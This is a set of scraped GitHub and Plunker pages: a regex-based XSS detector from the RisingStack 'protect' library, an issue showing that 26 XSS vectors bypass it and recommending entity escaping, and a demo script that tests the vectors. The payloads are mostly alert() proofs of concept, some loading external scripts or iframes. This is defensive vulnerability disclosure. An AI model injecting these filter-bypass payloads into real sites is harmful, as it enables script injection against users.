=== Content from github.com_d6ccc46d_20250124_162603.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRisingStack%2Fprotect%2Fblob%2F60b0c91e86686d34e5202419ce9ae7e8dc08edcd%2Flib%2Frules%2Fxss.js)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRisingStack%2Fprotect%2Fblob%2F60b0c91e86686d34e5202419ce9ae7e8dc08edcd%2Flib%2Frules%2Fxss.js)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RisingStack%2Fprotect)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RisingStack](/RisingStack)
/
**[protect](/RisingStack/protect)**
Public

* [Notifications](/login?return_to=%2FRisingStack%2Fprotect) You must be signed in to change notification settings
* [Fork
  23](/login?return_to=%2FRisingStack%2Fprotect)
* [Star
   402](/login?return_to=%2FRisingStack%2Fprotect)

* [Code](/RisingStack/protect)
* [Issues
  6](/RisingStack/protect/issues)
* [Pull requests
  2](/RisingStack/protect/pulls)
* [Actions](/RisingStack/protect/actions)
* [Projects
  0](/RisingStack/protect/projects)
* [Security](/RisingStack/protect/security)
* [Insights](/RisingStack/protect/pulse)

Additional navigation options

* [Code](/RisingStack/protect)
* [Issues](/RisingStack/protect/issues)
* [Pull requests](/RisingStack/protect/pulls)
* [Actions](/RisingStack/protect/actions)
* [Projects](/RisingStack/protect/projects)
* [Security](/RisingStack/protect/security)
* [Insights](/RisingStack/protect/pulse)

## Files

¬†60b0c91
## Breadcrumbs

1. [protect](/RisingStack/protect/tree/60b0c91e86686d34e5202419ce9ae7e8dc08edcd)
2. /[lib](/RisingStack/protect/tree/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib)
3. /[rules](/RisingStack/protect/tree/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib/rules)
/
# xss.js

Copy path Blame  Blame
## Latest commit

## History

[History](/RisingStack/protect/commits/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib/rules/xss.js)15 lines (11 loc) ¬∑ 460 Bytes¬†60b0c91
## Breadcrumbs

1. [protect](/RisingStack/protect/tree/60b0c91e86686d34e5202419ce9ae7e8dc08edcd)
2. /[lib](/RisingStack/protect/tree/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib)
3. /[rules](/RisingStack/protect/tree/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib/rules)
/
# xss.js

Top
## File metadata and controls

* Code
* Blame

15 lines (11 loc) ¬∑ 460 Bytes[Raw](https://github.com/RisingStack/protect/raw/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib/rules/xss.js)123456789101112131415'use strict'
/\*\* \* XSS regex reference - taken from symantec \* http://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks \*/
const xssSimple = new RegExp('((%3C)|<)((%2F)|/)\*[a-z0-9%]+((%3E)|>)', 'i')const xssImgSrc = new RegExp('((%3C)|<)((%69)|i|(%49))((%6D)|m|(%4D))((%67)|g|(%47))[^\n]+((%3E)|>)', 'i')
function isXss (value) { return xssSimple.test(value) || xssImgSrc.test(value)}
module.exports = isXss

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_e9092068_20250124_162604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRisingStack%2Fprotect%2Fissues%2F16)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRisingStack%2Fprotect%2Fissues%2F16)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=RisingStack%2Fprotect)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RisingStack](/RisingStack)
/
**[protect](/RisingStack/protect)**
Public

* [Notifications](/login?return_to=%2FRisingStack%2Fprotect) You must be signed in to change notification settings
* [Fork
  23](/login?return_to=%2FRisingStack%2Fprotect)
* [Star
   402](/login?return_to=%2FRisingStack%2Fprotect)

* [Code](/RisingStack/protect)
* [Issues
  6](/RisingStack/protect/issues)
* [Pull requests
  2](/RisingStack/protect/pulls)
* [Actions](/RisingStack/protect/actions)
* [Projects
  0](/RisingStack/protect/projects)
* [Security](/RisingStack/protect/security)
* [Insights](/RisingStack/protect/pulse)

Additional navigation options

* [Code](/RisingStack/protect)
* [Issues](/RisingStack/protect/issues)
* [Pull requests](/RisingStack/protect/pulls)
* [Actions](/RisingStack/protect/actions)
* [Projects](/RisingStack/protect/projects)
* [Security](/RisingStack/protect/security)
* [Insights](/RisingStack/protect/pulse)

# Vulnerable to XSS attacks¬†#16

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkOpenOpen[Vulnerable to XSS attacks](#top)#16Copy link[![@cianmce](https://avatars.githubusercontent.com/u/4098222?u=7632722ec6d68e8473d114dac397bd56ba357bc6&v=4&size=80)](/cianmce)
## Description

[![@cianmce](https://avatars.githubusercontent.com/u/4098222?u=7632722ec6d68e8473d114dac397bd56ba357bc6&v=4&size=48)](/cianmce)[cianmce](https://github.com/cianmce)opened [on Mar 26, 2018](https://github.com/RisingStack/protect/issues/16#issue-308772701)

I found multiple XSS Attack vectors that aren't caught by the `isXss` function:

[protect/lib/rules/xss.js](https://github.com/RisingStack/protect/blob/60b0c91e86686d34e5202419ce9ae7e8dc08edcd/lib/rules/xss.js#L4-L13)

Lines 4 to 13
in
[60b0c91](/RisingStack/protect/commit/60b0c91e86686d34e5202419ce9ae7e8dc08edcd)

|  | \* XSS regex reference - taken from symantec |
| --- | --- |
|  | \* http://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks |
|  | \*/ |
|  |  |
|  | const xssSimple = new RegExp('((%3C)|<)((%2F)|/)\*[a-z0-9%]+((%3E)|>)', 'i') |
|  | const xssImgSrc = new RegExp('((%3C)|<)((%69)|i|(%49))((%6D)|m|(%4D))((%67)|g|(%47))[^\n]+((%3E)|>)', 'i') |
|  |  |
|  | function isXss (value) { |
|  | return xssSimple.test(value) || xssImgSrc.test(value) |
|  | } |

## tl;dr

Don't use regex's for sanitization of HTML but if you are, then at least strip out all tags with something like:

```
const xssAnyTag = new RegExp('<(|\/|[^\/>][^>]+|\/[^>][^>]+)>')
```

But with even this, I'd imagine a carefully constructed XSS vector could get around it

I'd advise:

* Escaping the characters using HTML entities

  e.g.

```
var entityMap = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
  '/': '&#x2F;',
  '`': '&#x60;',
  '=': '&#x3D;'
};
escapeHtml = function(value) {
  return String(value).replace(/[&<>"'`=\/]/g, function (s) {
    return entityMap[s];
  });
}
```

* Using a nodes text attribute(This isn't an option for server side code)

  e.g.

```
document.getElementById("my_id").innerText = unsafeString;
```

---

As discussed in many posts e.g.

* <https://stackoverflow.com/a/535022>
* <https://www.quora.com/What-is-a-good-regular-expression-for-preventing-XSS-attacks-in-JavaScript>

Regular expressions are not a valid approach when dealing with a more complicated language(especially when browsers support *dirty* HTML)

For example, here are 26 valid XSS attack vectors that are all reported as `false`

## Attack Vectors

```
<script >alert("XSS - 1");</script >
<script type="application/javascript">alert("XSS - 2");</script >
<script src="https://rawgit.com/cianmce/bc4ede289eba9eb34c5ef499ac3298eb/raw/1d80cdd168bdc4389ed011d41ecca4242ca633e8/xss-alert.js?msg=XSS - 3"></script >
<meta http-equiv="refresh" content="0;URL=https://httpbin.org/get?xss=XSS - 4" />
<input type="image" src onerror="alert('XSS - 5')">
<object data="a.a" onerror="alert('XSS - 6')" />
<object data="a.a" onerror="alert('XSS - 7')">
<link data="a.a" onerror="alert('XSS - 8')">
<input onfocus="console.log('XSS - 9')" autofocus> // Uses console.log as "alert" will cause infinate loop
<video ><source onerror="alert('XSS - 10')" >
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 11')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 12')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;" />
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 13')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"></iframe >
<iframe style="display:none;" src="https://rawgit.com/cianmce/774471fbcffd4e31a950fbffa9b9a4d0/raw/7d68ac13ae3cca900ae3cec7cb21cf1f1c36d957/alert.html?msg=XSS - 14"></iframe >
<iframe style="display:none;" src="https://rawgit.com/cianmce/774471fbcffd4e31a950fbffa9b9a4d0/raw/7d68ac13ae3cca900ae3cec7cb21cf1f1c36d957/alert.html?msg=XSS - 15">
<iframe style="display:none;" src="//a.a" onload="alert('XSS - 16');"></iframe >
<div style="opacity: 0; width:100%; height:100%; position:absolute; top:0px; left:0px; z-index:9999" onmousemove="alert('XSS - 17')"></div >
<p style="opacity: 0; width:100%; height:100%; position:absolute; top:0px; left:0px; z-index:9999" onmousemove="alert('XSS - 18')">
<frameset onload="alert('XSS - 19')"><frame onload="Limited support"></frameset >
<a href="javascript:alert('XSS - 20')" style="text-decoration: none; color:#000;" >
<a onclick="alert('XSS - 21')" style="text-decoration: none; color:#000;" >
<a onmouseover="alert('XSS - 22')" style="text-decoration: none; color:#000;" >
<body onunload="alert('XSS - 23')">
<body onresize="alert('XSS - 24');">
<body onload="alert('XSS - 25')">
  <!-- XSS - 26: No JavaScript, but fully hides the page and prevents any clicks -->
<body style="opacity:0; pointer-events: none; filter: alpha(opacity=0);">
```
## Proof Of Concept

These have been tested on the current function, the updated function to test for any tags, being escaped and being set using the text attribute.

The results can be seen here: <http://embed.plnkr.co/xHbhB29JWWyMUMeHsLrm>

I'm sure there are many other edge cases I haven't thought of yet or that haven't been developed by browsers yet.

If you insist on using regex, here's a good list + just remove any tag

<https://github.com/PHPIDS/PHPIDS/blob/master/lib/IDS/default_filter.json>

üëç1
## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from embed.plnkr.co_0cbf9732_20250124_162602.html ===

```
<html>
<html>
<head>
  <title>XSS</title>
</head>
<body>
  <a href="xss.html">View XSS's in action here</a>
   - some may interfer with other, to view an individual vector remove all other vectors

  <br>
  <br>
  <br>
  <hr>
  <pre id="results"></pre>
  <div id="results_html"></div>
  <div id="results_text"></div>
  <script type="text/javascript" src="script.js"></script>
</body>
</html>

```
```
var xsss = [
`<script >alert("XSS - 1");</script >`,
`<script type="application/javascript">alert("XSS - 2");</script >`,
`<script src="https://rawgit.com/cianmce/bc4ede289eba9eb34c5ef499ac3298eb/raw/1d80cdd168bdc4389ed011d41ecca4242ca633e8/xss-alert.js?msg=XSS - 3"></script >`,
`<meta http-equiv="refresh" content="0;URL=https://httpbin.org/get?xss=XSS - 4" />`,
`<input type="image" src onerror="alert('XSS - 5')">`,
`<object data="a.a" onerror="alert('XSS - 6')" />`,
`<object data="a.a" onerror="alert('XSS - 7')">`,
`<link data="a.a" onerror="alert('XSS - 8')">`,
`<input onfocus="console.log('XSS - 9')" autofocus> // Uses console.log as "alert" will cause infinate loop`,
`<video ><source onerror="alert('XSS - 10')" >`,
`<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 11')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">`,
`<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 12')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;" />`,
`<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 13')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"></iframe >`,
`<iframe style="display:none;" src="https://rawgit.com/cianmce/774471fbcffd4e31a950fbffa9b9a4d0/raw/7d68ac13ae3cca900ae3cec7cb21cf1f1c36d957/alert.html?msg=XSS - 14"></iframe >`,
`<iframe style="display:none;" src="https://rawgit.com/cianmce/774471fbcffd4e31a950fbffa9b9a4d0/raw/7d68ac13ae3cca900ae3cec7cb21cf1f1c36d957/alert.html?msg=XSS - 15">`,
`<iframe style="display:none;" src="//a.a" onload="alert('XSS - 16');"></iframe >`,
`<div style="opacity: 0; width:100%; height:100%; position:absolute; top:0px; left:0px; z-index:9999" onmousemove="alert('XSS - 17')"></div >`,
`<p style="opacity: 0; width:100%; height:100%; position:absolute; top:0px; left:0px; z-index:9999" onmousemove="alert('XSS - 18')">`,
`<frameset onload="alert('XSS - 19')"><frame onload="Limited support"></frameset >`,
`<a href="javascript:alert('XSS - 20')" style="text-decoration: none; color:#000;" > `,
`<a onclick="alert('XSS - 21')" style="text-decoration: none; color:#000;" > `,
`<a onmouseover="alert('XSS - 22')" style="text-decoration: none; color:#000;" > `,
`<body onunload="alert('XSS - 23')">`,
`<body onresize="alert('XSS - 24');">`,
`<body onload="alert('XSS - 25')">`,
`<body style="opacity:0; pointer-events: none; filter: alpha(opacity=0);">`,
]

var xssSimple = new RegExp('((%3C)|<)((%2F)|/)*[a-z0-9%]+((%3E)|>)', 'i')
var xssImgSrc = new RegExp('((%3C)|<)((%69)|i|(%49))((%6D)|m|(%4D))((%67)|g|(%47))[^\n]+((%3E)|>)', 'i')
var xssAnyTag = new RegExp('<(|\/|[^\/>][^>]+|\/[^>][^>]+)>')

log("\n## Current isXss function:")
isXss = function(value) {
  return xssSimple.test(value) || xssImgSrc.test(value)
}

// prints false for all
for(var i in xsss){
  log( isXss(xsss[i]) + ": isXss(`" + xsss[i] + "`)");
}

log("\n## isXss function that strips all tags:")
// Current isXss function that also checks for any tags
isXss = function(value) {
  return xssSimple.test(value) || xssImgSrc.test(value) || xssAnyTag.test(value)
}

// prints true for all
for(var i in xsss){
  log( isXss(xsss[i]) + ": isXss(`" + xsss[i] + "`)");
}

var entityMap = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
  '/': '&#x2F;',
  '`': '&#x60;',
  '=': '&#x3D;'
};

escapeHtml = function(value) {
  return String(value).replace(/[&<>"'`=\/]/g, function (s) {
    return entityMap[s];
  });
}

log_html("<b>Directly writing escaped Html safely</b>")

for(var i in xsss){
  log_html( escapeHtml(xsss[i]) );
}

log_text("\n## Directly writing unescaped Html safely to the text attribute</b>")

for(var i in xsss){
  log_text(xsss[i]);
}

function log_text(html){
  document.getElementById("results_text").innerText += html + "\n";
}

function log_html(html){
  document.getElementById("results_html").innerHTML += html + "<br>";
}

function log(text){
  document.getElementById("results").innerText += text + "\n";
}

```
```
To test an individual vector, remove all except that line

<script >alert("XSS - 1");</script >
<script type="application/javascript">alert("XSS - 2");</script >
<script src="https://rawgit.com/cianmce/bc4ede289eba9eb34c5ef499ac3298eb/raw/1d80cdd168bdc4389ed011d41ecca4242ca633e8/xss-alert.js?msg=XSS - 3"></script >
<meta http-equiv="refresh" content="0;URL=https://httpbin.org/get?xss=XSS - 4" />
<input type="image" src onerror="alert('XSS - 5')">
<object data="a.a" onerror="alert('XSS - 6')" />
<object data="a.a" onerror="alert('XSS - 7')">
<link data="a.a" onerror="alert('XSS - 8')">
<input onfocus="console.log('XSS - 9')" autofocus> // Uses console.log as "alert" will cause infinate loop
<video ><source onerror="alert('XSS - 10')" >
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 11')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 12')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;" />
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS - 13')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"></iframe >
<iframe style="display:none;" src="https://rawgit.com/cianmce/774471fbcffd4e31a950fbffa9b9a4d0/raw/7d68ac13ae3cca900ae3cec7cb21cf1f1c36d957/alert.html?msg=XSS - 14"></iframe >
<iframe style="display:none;" src="https://rawgit.com/cianmce/774471fbcffd4e31a950fbffa9b9a4d0/raw/7d68ac13ae3cca900ae3cec7cb21cf1f1c36d957/alert.html?msg=XSS - 15">
<iframe style="display:none;" src="//a.a" onload="alert('XSS - 16');"></iframe >
<div style="opacity: 0; width:100%; height:100%; position:absolute; top:0px; left:0px; z-index:9999" onmousemove="alert('XSS - 17')"></div >
<p style="opacity: 0; width:100%; height:100%; position:absolute; top:0px; left:0px; z-index:9999" onmousemove="alert('XSS - 18')">
<frameset onload="alert('XSS - 19')"><frame onload="Limited support"></frameset >
<a href="javascript:alert('XSS - 20')" style="text-decoration: none; color:#000;" >
<a onclick="alert('XSS - 21')" style="text-decoration: none; color:#000;" >
<a onmouseover="alert('XSS - 22')" style="text-decoration: none; color:#000;" >
<body onunload="alert('XSS - 23')">
<body onresize="alert('XSS - 24');">
<body onload="alert('XSS - 25')">
  <!-- XSS - 26: No JavaScript, but fully hides the page and prevents any clicks -->
<body style="opacity:0; pointer-events: none; filter: alpha(opacity=0);">

```


